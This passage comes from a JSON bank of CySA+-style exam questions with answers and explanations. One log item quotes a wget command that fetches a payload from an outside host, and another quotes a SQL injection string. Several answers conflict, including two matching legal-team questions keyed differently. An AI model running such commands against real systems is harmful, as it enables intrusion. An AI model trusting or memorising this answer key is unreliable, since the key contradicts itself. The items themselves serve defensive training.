    "question": "A SOC analyst determined that a significant number of the reported alarms could be closed after\nremoving the duplicates. Which of the following could help the analyst reduce the number of alarms\nwith the least effort?",
    "options": [
      "A. SOAR",
      "B. API",
      "C. XDR",
      "D. REST"
    ],
    "answer": "A",
    "explanation": "Security Orchestration, Automation, and Response (SOAR) can help the SOC analyst reduce the\nnumber of alarms by automating the process of removing duplicates and managing security alerts\nmore efficiently. SOAR platforms enable security teams to define, prioritize, and standardize\nresponse procedures, which helps in reducing the workload and improving the overall efficiency of\nincident response by handling repetitive and low-level tasks automatically.",
    "image": "images/page_251_img_2.jpeg"
  },
  {
    "id": "q-jc-321",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A company is launching a new application in its internal network, where internal customers can\ncommunicate with the service desk. The security team needs to ensure the application will be able\nto handle unexpected strings with anomalous formats without crashing. Which of the following\nprocesses is the most applicable for testing the application to find how it would behave in such a\nsituation?",
    "options": [
      "A. Fuzzing",
      "B. Coding review",
      "C. Debugging",
      "D. Static analysis"
    ],
    "answer": "A",
    "explanation": "Fuzzing is a process used to test applications by inputting unexpected or random data to see how the\napplication behaves. This method is particularly effective in identifying vulnerabilities such as buffer\noverflows, input validation errors, and other anomalies that could cause the application to crash or\nbehave unexpectedly. By using fuzzing, the security team can ensure the new application is robust\nand capable of handling unexpected strings with anomalous formats without crashing.",
    "image": "images/page_251_img_2.jpeg"
  },
  {
    "id": "q-jc-324",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A regulated organization experienced a security breach that exposed a list of customer names with\ncorresponding PH dat\na. Which of the following is the best reason for developing the organization's communication plans?",
    "options": [
      "A. For the organization's public relations department to have a standard notification",
      "B. To ensure incidents are immediately reported to a regulatory agency",
      "C. To automate the notification to customers who were impacted by the breach",
      "D. To have approval from executive leadership on when communication should occur"
    ],
    "answer": "B",
    "explanation": "Developing an organization's communication plans is crucial to ensure that incidents, especially\nthose involving sensitive data like PH (Protected Health) data, are promptly reported to the relevant\nregulatory agencies. This is essential for compliance with legal and regulatory requirements, which\noften mandate timely notification of data breaches. Effective communication plans help the\norganization manage the breach response process, mitigate potential legal penalties, and maintain\ntransparency with regulatory bodies.",
    "image": "images/page_259_img_2.jpeg"
  },
  {
    "id": "q-jc-325",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An incident response team member is triaging a Linux server. The output is shown below:\n$ cat /etc/passwd\nroot:x:0:0::/:/bin/zsh\nbin:x:1:1::/:/usr/bin/nologin\ndaemon:x:2:2::/:/usr/bin/nologin\nmail:x:8:12::/var/spool/mail:/usr/bin/nologin\nhttp:x:33:33::/srv/http:/bin/bash\nnobody:x:65534:65534:Nobody:/:/usr/bin/nologin\ngit:x:972:972:git daemon user:/:/usr/bin/git-shell\n$ cat /var/log/httpd\nat org.apache.catalina.core.ApplicationFilterChain.internaDoFilter(ApplicationFilterChain.java:241)\nat org.apache.catalina.core.ApplicationFilterChain.internaDoFilter(ApplicationFilterChain.java:208)\nat org.java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:316)\nat org.java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\nWARN [struts2.dispatcher.multipart.JakartaMultipartRequest] Unable to parse request\ncontainer.getlnstance.(#wget http://grohl.ve.da/tmp/brkgtr.zip;#whoami)\nat\norg.apache.commons.fileupload.FileUploadBase$FileUploadBase$FileItemIteratorImpl.<init>(FileUpl\noadBase.java:947) at\norg.apache.commons.fileupload.FileUploadBase.getItemiterator(FileUploadBase.java:334)\nat\norg.apache.struts2.dispatcher.multipart.JakartaMultipartRequest.parseRequest(JakartaMultiPartReq\nuest.java:188)\norg.apache.struts2.dispatcher.multipart.JakartaMultipartRequest.parseRequest(JakartaMultipartReq\nuest.java:423)\nWhich of the following is the adversary most likely trying to do?",
    "options": [
      "A. Create a backdoor root account named zsh.",
      "B. Execute commands through an unsecured service account.",
      "C. Send a beacon to a command-and-control server.",
      "D. Perform a denial-of-service attack on the web server."
    ],
    "answer": "B",
    "explanation": "The log output indicates an attempt to execute a command via an unsecured service account,\nspecifically using a wget command to download a file from an external source. This suggests that the\nadversary is trying to exploit a vulnerability in the web server to run unauthorized commands, which\nis a common technique for gaining a foothold or further compromising the system. The presence of\nwget http://grohl.ve.da/tmp/brkgtr.zip indicates an attempt to download and possibly\nexecute a malicious payload.",
    "image": null
  },
  {
    "id": "q-jc-326",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following explains the importance of a timeline when providing an incident response\nreport?",
    "options": [
      "A. The timeline contains a real-time record of an incident and provides information that helps to\nsimplify a postmortem analysis.",
      "B. An incident timeline provides the necessary information to understand the actions taken to\nmitigate the threat or risk.",
      "C. The timeline provides all the information, in the form of a timetable, of the whole incident\nresponse process including actions taken.",
      "D. An incident timeline presents the list of commands executed by an attacker when the system was\ncompromised, in the form of a timetable."
    ],
    "answer": "C",
    "explanation": "An incident response timeline is a detailed chronological record of all events and actions taken\nduring the response to a security incident. It includes timestamps and descriptions of each step,\nproviding a comprehensive overview of how the incident was detected, contained, mitigated, and\nresolved. This timeline is crucial for post-incident analysis, helping to understand the effectiveness of\nthe response, identify areas for improvement, and ensure accountability and transparency in the\nincident handling process.",
    "image": "images/page_262_img_2.jpeg"
  },
  {
    "id": "q-jc-327",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "An organization receives a legal hold request from an attorney. The request pertains to emails related\nto a disputed vendor contract. Which of the following is the first step for the security team to take to\nensure compliance with the request?",
    "options": [
      "A. Publicly disclose the request to other vendors.",
      "B. Notify the departments involved to preserve potentially relevant information.",
      "C. Establish a chain of custody, starting with the attorney's request.",
      "D. Back up the mailboxes on the server and provide the attorney with a copy."
    ],
    "answer": "B",
    "explanation": "The first step for the security team when receiving a legal hold request is to notify the relevant\ndepartments to preserve all potentially relevant information. This ensures that no data is altered,\ndeleted, or otherwise tampered with, which is critical for maintaining the integrity of the evidence.\nPreserving information includes emails, documents, and any other data that might be relevant to the\nlegal matter. Establishing a chain of custody and backing up data are also important steps, but\nnotifying the involved parties is the immediate priority to prevent data loss.",
    "image": "images/page_262_img_2.jpeg"
  },
  {
    "id": "q-jc-330",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security administrator has found indications of dictionary attacks against the company's external-\nfacing portal. Which of the following should be implemented to best mitigate the password attacks?",
    "options": [
      "A. Multifactor authentication",
      "B. Password complexity",
      "C. Web application firewall",
      "D. Lockout policy"
    ],
    "answer": "D",
    "explanation": "Dictionary attacks involve an attacker attempting to guess passwords by using a list of common\npasswords. Implementing a lockout policy is effective because it limits the number of login attempts,\nthereby hindering the attacker's ability to repeatedly attempt different passwords. Lockout policies\nare standard in cybersecurity practices to prevent brute-force and dictionary attacks by temporarily\ndisabling an account after a certain number of failed login attempts. According to CompTIA Security+\nstandards, password complexity (option B) and multifactor authentication (option A) are helpful but\nare not as immediately effective in directly preventing repeated attempts as a lockout policy.",
    "image": "images/page_269_img_2.jpeg"
  },
  {
    "id": "q-jc-331",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following best explains the importance of the implementation of a secure software\ndevelopment life cycle in a company with an internal development team?",
    "options": [
      "A. Increases the product price by using the implementation as a piece of marketing",
      "B. Decreases the risks of the software usage and complies with regulatory requirements",
      "C. Improves the agile process and decreases the amount of tests before the final deployment",
      "D. Transfers the responsibility for security flaws to the vulnerability management team"
    ],
    "answer": "B",
    "explanation": "A Secure Software Development Life Cycle (SDLC) integrates security measures at each stage of\ndevelopment to reduce vulnerabilities and improve the overall security of the software. This is\nessential for minimizing risks related to software usage and ensuring compliance with regulatory\nrequirements, which is particularly important for organizations handling sensitive data. As per\nCompTIA standards, a Secure SDLC helps prevent security breaches and protects both the\norganization and its users from potential harm. Options A, C, and D do not accurately describe the\nprimary goals of a Secure SDLC, which primarily centers on risk reduction and regulatory compliance.",
    "image": null
  },
  {
    "id": "q-jc-332",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Which of the following is the best reason to implement an MOU?",
    "options": [
      "A. To create a business process for configuration management",
      "B. To allow internal departments to understand security responsibilities",
      "C. To allow an expectation process to be defined for legacy systems",
      "D. To ensure that all metrics on service levels are properly reported"
    ],
    "answer": "B",
    "explanation": "A Memorandum of Understanding (MOU) is a formal agreement that outlines the roles and\nresponsibilities of each party involved in a particular process or project, especially within security\nframeworks. In the context of cybersecurity, an MOU is commonly used to clarify and document the\nsecurity responsibilities of different departments or entities involved. It helps ensure everyone\nunderstands their specific duties and contributions to security, which is crucial for coordination and\nrisk management. According to CompTIA Security+ guidelines, while options A, C, and D describe\nother forms of agreements, they do not capture the essential purpose of an MOU as accurately as\noption B does.",
    "image": null
  },
  {
    "id": "q-jc-333",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A SOC analyst observes reconnaissance activity from an IP address. The activity follows a pattern of\nshort bursts toward a low number of targets. An open-source review shows that the IP has a bad\nreputation. The perimeter firewall logs indicate the inbound traffic was allowed. The destination\nhosts are high-value assets with EDR agents installed. Which of the following is the best action for\nthe SOC to take to protect against any further activity from the source IP?",
    "options": [
      "A. Add the IP address to the EDR deny list.",
      "B. Create a SIEM signature to trigger on any activity from the source IP subnet detected by the web\nproxy or firewalls for immediate notification.",
      "C. Implement a prevention policy for the IP on the WAF",
      "D. Activate the scan signatures for the IP on the NGFWs."
    ],
    "answer": "A",
    "explanation": "In this scenario, adding the IP address to the EDR (Endpoint Detection and Response) deny list is an\nimmediate and effective way to block further reconnaissance activities from the malicious source.\nEDR solutions are designed to provide advanced endpoint security, including blocking specific IP\naddresses and preventing potentially harmful traffic. This proactive step aligns with CompTIA\nCybersecurity Analyst (CySA+) best practices for threat prevention and response. While other\noptions, such as using SIEM for monitoring (option B) or WAF policies (option C), provide additional\nlayers of security, they do not directly block the threat in the same immediate way that adding the IP\nto the EDR deny list does.",
    "image": null
  },
  {
    "id": "q-jc-334",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A new SOC manager reviewed findings regarding the strengths and weaknesses of the last tabletop\nexercise in order to make improvements. Which of the following should the SOC manager utilize to\nimprove the process?",
    "options": [
      "A. The most recent audit report",
      "B. The incident response playbook",
      "C. The incident response plan",
      "D. The lessons-learned register"
    ],
    "answer": "D",
    "explanation": "The lessons-learned register is an essential document that captures insights and feedback from past\nexercises or incidents, highlighting what went well and what did not. By utilizing this register, the\nSOC manager can identify specific areas for improvement and develop actionable steps to enhance\nfuture response efforts. According to CompTIA’s CySA+ and Security+ guidance, lessons learned from\ntabletop exercises are crucial for iterative improvements in an incident response plan. Options A, B,\nand C are useful resources, but the lessons-learned register specifically focuses on reflection and\nimprovement, which is the primary objective in this context.",
    "image": null
  },
  {
    "id": "q-jc-335",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "K company has recently experienced a security breach via a public-facing service. Analysis of the\nevent on the server was traced back to the following piece of code:\nSELECT ’ From userjdata WHERE Username = 0 and userid8 1 or 1=1;—\nWhich of the following controls would be best to implement?",
    "options": [
      "A. Deploy a wireless application protocol.",
      "B. Remove the end-of-life component.",
      "C. Implement proper access control.",
      "D. Validate user input."
    ],
    "answer": "D",
    "explanation": "The code snippet provided suggests an SQL injection vulnerability, indicated by the use of \"1=1,\"\nwhich is a common SQL injection technique to bypass authentication. To mitigate this risk, validating\nuser input is the most effective control, as it ensures that any input is properly sanitized and escapes\npotentially malicious characters before interacting with the database. This is a key principle from\nCompTIA Security+ guidelines on secure coding practices. Options A and B are unrelated to the\nvulnerability type here, and while access control (Option C) is generally good practice, it does not\nspecifically prevent SQL injection.",
    "image": null
  },
  {
    "id": "q-jc-336",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A report contains IoC and TTP information for a zero-day exploit that leverages vulnerabilities in a\nspecific version of a web application. Which of the following actions should a SOC analyst take first\nafter receiving the report?",
    "options": [
      "A. Implement a vulnerability scan to determine whether the environment is at risk.",
      "B. Block the IP addresses and domains from the report in the web proxy and firewalls.",
      "C. Verify whether the information is relevant to the organization.",
      "D. Analyze the web application logs to identify any suspicious or malicious activity."
    ],
    "answer": "C",
    "explanation": "Before taking any action, the SOC analyst should first verify if the Indicators of Compromise (IoC) and\nTactics, Techniques, and Procedures (TTPs) reported are relevant to the organization’s environment.\nThis involves checking if the vulnerable application or version is actually in use. As per CompTIA’s\nCySA+ guidelines, relevance verification helps in prioritizing resources and response actions\neffectively, ensuring that time is not wasted on threats that do not impact the organization. Options\nA, B, and D are important subsequent steps if the threat is deemed relevant.",
    "image": null
  },
  {
    "id": "q-jc-337",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A systems administrator is reviewing after-hours traffic flows from data center servers and sees\nregular, outgoing HTTPS connections from one of the servers to a public IP address. The server\nshould not be making outgoing connections after hours. Looking closer, the administrator sees this\ntraffic pattern around the clock during work hours as well. Which of the following is the most likely\nexplanation?",
    "options": [
      "A. Command-and-control beaconing activity",
      "B. Data exfiltration",
      "C. Anomalous activity on unexpected ports",
      "D. Network host IP address scanning",
      "E. A rogue network device"
    ],
    "answer": "A",
    "explanation": "Command-and-control (C2) beaconing involves compromised systems communicating with an\nattacker’s server at regular intervals, often using HTTPS to blend in with legitimate traffic. This is\nindicative of a potential compromise where malware communicates back to a command center. The\npersistent nature of the connections after hours and throughout the day suggests automated\nbeaconing, which is a tell-tale sign of C2 activity. According to CompTIA CySA+, this type of activity\nshould raise immediate suspicion and warrants further investigation and containment. While options\nB, C, D, and E might indicate other issues, they do not fit the pattern described as well as option A.",
    "image": null
  },
  {
    "id": "q-jc-338",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A web application has a function to retrieve content from an internal URL to identify CSRF attacks in\nthe logs. The security analyst is building a regular expression that will filter out the correctly\nformatted requests. The target URL is https://10.1.2.3/api, and the receiving API only accepts GET\nrequests and uses a single integer argument named \"id.\" Which of the following regular expressions\nshould the analyst use to achieve the objective?",
    "options": [
      "A. (?!https://10\\.1\\.2\\.3/api\\?id=[0-9]+)",
      "B. \"https://10\\.1\\.2\\.3/api\\?id=\\d+",
      "C. (?:\"https://10\\.1\\.2\\.3/api\\?id-[0-9]+)",
      "D. https://10\\.1\\.2\\.3/api\\?id«[0-9J$"
    ],
    "answer": "B",
    "explanation": "The correct regular expression to match a GET request to this API endpoint is\n\"https://10\\.1\\.2\\.3/api\\?id=\\d+\". This pattern checks for the specific URL with an id parameter that\naccepts integer values. The syntax \\d+ matches one or more digits, which aligns with the\nrequirement for a single integer argument. Other options either use incorrect syntax or do not\naccurately capture the expected URL format. Regular expressions are vital in filtering and identifying\npatterns in logs, as recommended by CompTIA Cybersecurity Analyst (CySA+) practices for threat\nhunting and log analysis.",
    "image": null
  },
  {
    "id": "q-jc-339",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Which of the following best explains the importance of network microsegmentation as part of a Zero\nTrust architecture?",
    "options": [
      "A. To allow policies that are easy to manage and less granular",
      "B. To increase the costs associated with regulatory compliance",
      "C. To limit how far an attack can spread",
      "D. To reduce hardware costs with the use of virtual appliances"
    ],
    "answer": "C",
    "explanation": "Microsegmentation involves dividing a network into smaller, isolated segments to restrict lateral\nmovement within the network. This is crucial within a Zero Trust architecture, which assumes that no\nentity (internal or external) is inherently trustworthy. By limiting access to only necessary network\nsegments, microsegmentation reduces the impact of a potential breach by containing it within a\nlimited area. CompTIA emphasizes microsegmentation as an effective strategy to minimize risk and\nimprove security posture by isolating resources based on the principle of least privilege.",
    "image": null
  },
  {
    "id": "q-jc-340",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A company's internet-facing web application has been compromised several times due to identified\ndesign flaws. The company would like to minimize the risk of these incidents from reoccurring and\nhas provided the developers with better security training. However, the company cannot allocate any\nmore internal resources to the issue. Which of the following are the best options to help identify\nflaws within the system? (Select two).",
    "options": [
      "A. Deploying a WAF",
      "B. Performing a forensic analysis",
      "C. Contracting a penetration test",
      "D. Holding a tabletop exercise",
      "E. Creating a bug bounty program",
      "F. Implementing threat modeling"
    ],
    "answer": [
      "C",
      "F"
    ],
    "explanation": "C. Contracting a penetration test and F. Implementing threat modeling are the two best options for an organization wanting to minimize exposure of design flaws in a repeatedly compromised internet-facing web application. Threat modeling (F) systematically identifies architectural security weaknesses and design flaws during development or review, addressing root causes. Penetration testing (C) simulates real attacks to find exploitable vulnerabilities in the current design. A WAF (A) provides compensating controls but does not fix design flaws. Forensic analysis (B) examines past incidents. Tabletop exercises (D) test response plans. Bug bounties (E) discover vulnerabilities but require researcher participation.",
    "image": null
  },
  {
    "id": "q-jc-341",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A network security analyst for a large company noticed unusual network activity on a critical system.\nWhich of the following tools should the analyst use to analyze network traffic to search for malicious\nactivity?",
    "options": [
      "A. WAF",
      "B. Wireshark",
      "C. EDR",
      "D. Nmap"
    ],
    "answer": "B",
    "explanation": "Wireshark is a network protocol analyzer that allows analysts to capture and inspect data packets\ntraveling through a network. This makes it ideal for investigating unusual network activity, as it\nprovides detailed insights into the nature and content of network traffic. In this case, Wireshark can\nhelp identify potentially malicious packets and understand the nature of the observed traffic. Options\nA (WAF) and C (EDR) are primarily used for monitoring and protecting web applications and\nendpoints, respectively, and Nmap (D) is typically used for network discovery and mapping, not\ndetailed traffic analysis. According to CompTIA CySA+, packet analysis tools like Wireshark are\ninvaluable for deep-dive investigations into network anomalies.",
    "image": null
  },
  {
    "id": "q-jc-342",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst is reviewing a dashboard from the company's SIEM and finds that an IP address known to\nbe malicious can be tracked to numerous high-priority events in the last two hours. The dashboard\nindicates that these events relate to TTPs. Which of the following is the analyst most likely using?",
    "options": [
      "A. MITRE ATT&CK",
      "B. OSSTMM",
      "C. Diamond Model of Intrusion Analysis",
      "D. OWASP"
    ],
    "answer": "A",
    "explanation": "The MITRE ATT&CK framework is widely used for tracking and categorizing Tactics, Techniques, and\nProcedures (TTPs) of adversaries. TTPs help analysts understand the behaviors and methods attackers\nemploy during incidents, making this framework particularly useful in SIEM dashboards for\ncorrelating and identifying threats. While the other options (OSSTMM, Diamond Model, OWASP)\noffer various security methodologies, MITRE ATT&CK is specifically focused on documenting\nadversary behaviors, making it the best fit here. CompTIA CySA+ often emphasizes MITRE ATT&CK\nfor mapping and understanding threat behaviors in incident response.",
    "image": null
  },
  {
    "id": "q-jc-343",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A Chief Information Security Officer wants to lock down the users' ability to change applications that\nare installed on their Windows systems. Which of the following is the best enterprise-level solution?",
    "options": [
      "A. HIPS",
      "B. GPO",
      "C. Registry",
      "D. DLP"
    ],
    "answer": "B",
    "explanation": "Group Policy Objects (GPO) are a feature in Windows environments that allow administrators to\ncontrol settings and permissions across user accounts and computers within an organization. GPOs\ncan restrict user permissions to prevent unauthorized installation or modification of applications,\nmaking them the best choice for centrally managing user capabilities on Windows systems. While\nHIPS (Host Intrusion Prevention Systems), Registry, and DLP (Data Loss Prevention) have their own\nuses, GPOs provide a scalable and enterprise-level solution for application control as per CompTIA\nSecurity+ guidelines.",
    "image": null
  },
  {
    "id": "q-jc-344",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A Chief Information Security Officer (CISO) has determined through lessons learned and an\nassociated after-action report that staff members who use legacy applications do not adequately\nunderstand how to differentiate between non-malicious emails and phishing emails. Which of the\nfollowing should the CISO include in an action plan to remediate this issue?",
    "options": [
      "A. Awareness training and education",
      "B. Replacement of legacy applications",
      "C. Organizational governance",
      "D. Multifactor authentication on all systems"
    ],
    "answer": "A",
    "explanation": "Awareness training and education are essential to help staff recognize phishing emails and\nunderstand safe email practices, particularly when using legacy applications that might not have the\nlatest security features. Training helps build a culture of security mindfulness, which is critical for\npreventing social engineering attacks. According to CompTIA Security+ and CySA+ frameworks, user\neducation is a fundamental aspect of organizational defense against phishing. Options like replacing\napplications or implementing MFA (while helpful) do not directly address the need for user\nawareness in this scenario.",
    "image": null
  },
  {
    "id": "q-jc-345",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following is most appropriate to use with SOAR when the security team would like to\nautomate actions across different vendor platforms?",
    "options": [
      "A. STIX/TAXII",
      "B. APIs",
      "C. Data enrichment",
      "D. Threat feed"
    ],
    "answer": "B",
    "explanation": "APIs (Application Programming Interfaces) enable integration and automation across different\nvendor platforms within a SOAR (Security Orchestration, Automation, and Response) solution. They\nallow security tools to communicate and execute automated actions, making them essential for\norchestrating responses across diverse systems and platforms. While STIX/TAXII provides standards\nfor threat information sharing, and data enrichment enhances context, APIs are the primary means\nof enabling cross-platform automation, as recommended in CompTIA CySA+ materials on SOAR\noperations.",
    "image": null
  },
  {
    "id": "q-jc-346",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following responsibilities does the legal team have during an incident management\nevent? (Select two).",
    "options": [
      "A. Coordinate additional or temporary staffing for recovery efforts.",
      "B. Review and approve new contracts acquired as a result of an event.",
      "C. Advise the Incident response team on matters related to regulatory reporting.",
      "D. Ensure all system security devices and procedures are in place.",
      "E. Conduct computer and network damage assessments for insurance.",
      "F. Verify that all security personnel have the appropriate clearances."
    ],
    "answer": [
      "B",
      "C"
    ],
    "explanation": "During an incident, the legal team plays a crucial role in handling regulatory compliance and\nreviewing legal implications, such as contractual obligations and reporting requirements. Advising on\nregulatory reporting (Option C) ensures the organization meets legal mandates, while reviewing\ncontracts (Option B) can address new or emergency services needed during the incident. According\nto CompTIA CySA+ and Security+ guidelines, these legal responsibilities are vital for compliance and\nrisk management. Options related to staffing, damage assessments, and clearances typically fall\nunder operational or HR responsibilities rather than legal purview.",
    "image": "images/page_280_img_2.png"
  },
  {
    "id": "q-jc-347",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Executives at an organization email sensitive financial information to external business partners\nwhen negotiating valuable contracts. To ensure the legal validity of these messages, the\ncybersecurity team recommends a digital signature be added to emails sent by the executives. Which\nof the following are the primary goals of this recommendation? (Select two).",
    "options": [
      "A. Confidentiality",
      "B. Integrity",
      "C. Privacy",
      "D. Anonymity",
      "E. Non-repudiation",
      "F. Authorization"
    ],
    "answer": [
      "B",
      "E"
    ],
    "explanation": "B. Integrity and E. Non-repudiation are the two properties that digital signatures provide for sensitive email communications. Integrity (B) ensures that the email content has not been altered during transit — the digital signature is mathematically tied to the exact content, so any modification invalidates the signature. Non-repudiation (E) ensures the sender cannot later deny sending the message, as the signature is tied to their private key. This is critical for legally binding contract negotiations. Confidentiality (A) requires encryption, not signatures. Privacy (C) and Anonymity (D) are protected by different controls. Authorization (F) controls access rights.",
    "image": "images/page_280_img_2.png"
  },
  {
    "id": "q-jc-348",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company patches its servers using automation software. Remote SSH or RDP connections are\nallowed to the servers only from the service account used by the automation software. All servers\nare in an internal subnet without direct access to or from the internet. An analyst reviews the\nfollowing vulnerability summary:\nWhich of the following vulnerability IDs should the analyst address first?",
    "options": [
      "A. Row 1",
      "B. Row 2",
      "C. Row 3",
      "D. Row 4"
    ],
    "answer": "B",
    "explanation": "The vulnerability with the highest CVSS score and an active exploit is Microsoft CVE-2021-34527\n(PrintNightmare). Although only present on two instances, its high severity (8.4) and exploitable\nnature make it a priority. PrintNightmare is a well-known remote code execution vulnerability, which\ncan be a critical risk. According to CompTIA CySA+ and vulnerability management practices,\nprioritizing based on severity and exploitability is essential, even over the number of instances.\nOther vulnerabilities listed are less severe or lack active exploitation.",
    "image": "images/page_280_img_2.png"
  },
  {
    "id": "q-jc-349",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following in the digital forensics process is considered a critical activity that often\nincludes a graphical representation of process and operating system events?",
    "options": [
      "A. Registry editing",
      "B. Network mapping",
      "C. Timeline analysis",
      "D. Write blocking"
    ],
    "answer": "C",
    "explanation": "Timeline analysis in digital forensics involves creating a chronological sequence of events based on\nsystem logs, file changes, and other forensic data. This process often uses graphical representations\nto illustrate and analyze how an incident unfolded over time, making it easier to identify key events\nand potential indicators of compromise. This approach is highlighted in CompTIA Cybersecurity\nAnalyst (CySA+) practices as crucial for understanding the scope and sequence of a security incident.\nThe other options do not involve chronological or graphical analysis to the extent that timeline\nanalysis does.",
    "image": null
  },
  {
    "id": "q-jc-350",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A SOC team lead occasionally collects some DNS information for investigations. The team lead\nassigns this task to a new junior analyst. Which of the following is the best way to relay the process\ninformation to the junior analyst?",
    "options": [
      "A. Ask another team member to demonstrate their process.",
      "B. Email a link to a website that shows someone demonstrating a similar process.",
      "C. Let the junior analyst research and develop a process.",
      "D. Write a step-by-step document on the team wiki outlining the process."
    ],
    "answer": "D",
    "explanation": "Documenting the process in a step-by-step format on the team wiki ensures the junior analyst has a\nclear, repeatable reference. This approach also supports consistency and accuracy, and the\ndocumentation can be updated or referenced by other team members as needed. CompTIA\nemphasizes the importance of procedural documentation in both CySA+ and Security+ for ensuring\nteam members have reliable resources for task execution, which aids in knowledge retention and\nstandardized practices across the team.",
    "image": null
  },
  {
    "id": "q-jc-351",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An organization identifies a method to detect unexpected behavior, crashes, or resource leaks in a\nsystem by feeding invalid, unexpected, or random data to stress the application. Which of the\nfollowing best describes this testing methodology?",
    "options": [
      "A. Reverse engineering",
      "B. Static",
      "C. Fuzzing",
      "D. Debugging"
    ],
    "answer": "C",
    "explanation": "Fuzzing is a testing technique where invalid or random data is inputted into a system to find\nvulnerabilities, crashes, or unexpected behaviors. It’s commonly used in software security to identify\nflaws that could lead to security breaches. According to CompTIA’s CySA+ curriculum, fuzzing is a\ndynamic testing method for exposing application weaknesses. Options like static testing (B) involve\nanalyzing code without execution, while reverse engineering (A) and debugging (D) involve different\nmethodologies for understanding or fixing code, not intentionally stressing it.",
    "image": null
  },
  {
    "id": "q-jc-352",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following responsibilities does the legal team have during an incident management\nevent? (Select two).",
    "options": [
      "A. Coordinate additional or temporary staffing for recovery efforts.",
      "B. Review and approve new contracts acquired as a result of an event.",
      "C. Advise the incident response team on matters related to regulatory reporting.",
      "D. Ensure all system security devices and procedures are in place.",
      "E. Conduct computer and network damage assessments for insurance.",
      "F. Verify that all security personnel have the appropriate clearances."
    ],
    "answer": [
      "C",
      "E"
    ],
    "explanation": "C. Advise the incident response team on matters related to regulatory reporting and legal obligations, and E. Conduct computer and network damage assessments for insurance and legal proceedings are the two core legal team responsibilities during incident management. The legal team ensures regulatory compliance (GDPR 72-hour notification, HIPAA breach notification, SEC disclosure requirements) and protects the organization from liability. Damage assessments (E) support insurance claims and potential litigation. Staffing coordination (A) is HR. Contract review (B) is procurement/legal but post-incident. Security device management (D) is IT security. Security clearance verification (F) is HR/security management.",
    "image": null
  },
  {
    "id": "q-jc-353",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A systems administrator needs to gather security events with repeatable patterns from Linux log\nfiles. Which of the following would the administrator most likely use for this task?",
    "options": [
      "A. A regular expression in Bash",
      "B. Filters in the vi editor",
      "C. Variables in a PowerShell script",
      "D. A playbook in a SOAR tool"
    ],
    "answer": "A",
    "explanation": "Regular expressions are powerful tools for searching text based on specific patterns, making them\nideal for parsing Linux log files to detect security events with repeatable patterns. In Bash, regular\nexpressions can be used in commands like grep or awk to efficiently filter log data. CompTIA CySA+\nemphasizes the use of regular expressions in log analysis for pattern matching, a common\nrequirement for identifying suspicious activities in log files. Options B, C, and D are less suited for this\nspecific task due to their limited pattern-matching capabilities or platform constraints.",
    "image": null
  },
  {
    "id": "q-jc-354",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst is reviewing a dashboard from the company’s SIEM and finds that an IP address known to\nbe malicious can be tracked to numerous high-priority events in the last two hours. The dashboard\nindicates that these events relate to TTPs. Which of the following is the analyst most likely using?",
    "options": [
      "A. MITRE ATT&CK",
